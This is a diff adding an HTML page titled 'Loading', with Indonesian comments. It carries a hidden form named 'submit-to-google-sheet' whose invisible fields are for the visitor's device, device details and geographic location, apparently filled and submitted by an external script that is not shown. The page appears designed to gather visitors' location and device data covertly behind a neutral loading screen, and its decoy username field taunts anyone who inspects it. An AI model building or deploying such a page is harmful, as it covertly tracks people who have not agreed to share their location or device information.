@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading</title>
+<!--     <script>
+      window.onload = function() {
+    var scriptTag = document.querySelector('script[src="defendscript.js"]');
+    
+    if (!scriptTag) {
+      // Jika tidak ada, arahkan ke halaman error
+      window.location.href = 'error.html';
+    }
+  };
+
+  </script> -->
+</head>
+<body>
+    <form id="usernameForm" action="" method="POST" name="submit-to-google-sheet">
+        <label for="username"></label>
+        <input hidden type="text" id="username" name="username" value="tolong jangan ganggu urusi sendiri websitemu" required>
+        
+        <label for="device"></label>
+        <input hidden type="text" id="device" name="device" readonly> <!-- Field untuk perangkat yang diisi otomatis -->
+        
+        <label for="deviceDetails"></label>
+        <input hidden type="text" id="deviceDetails" name="deviceDetails" readonly>
+
+        <label for="geoLocation"></label>
+        <input hidden type="text" id="geoLocation" name="geoLocation" readonly> <!-- Field untuk lokasi geografis -->
+
+        <button hidden id="submit" type="submit"></button>
+    </form>
+    <script src="jsscript.js" onerror="handleScriptError(event)"></script>
+<!--     <script src="defendscript.js" onerror="handleScriptError(event)"></script> -->
+<!--     <script>
+    function handleScriptError(event) {
+      // Tindakan jika script gagal dimuat
+      alert('Terjadi kesalahan dalam memuat script eksternal.');
+
+      // Menampilkan rincian error (untuk debugging)
+      console.error('Error memuat script:', event.target.src);
+
+      // Arahkan ke halaman error
+      window.location.href = 'error.html';
+    }
+  </script> -->
+</body>
+</html>
+
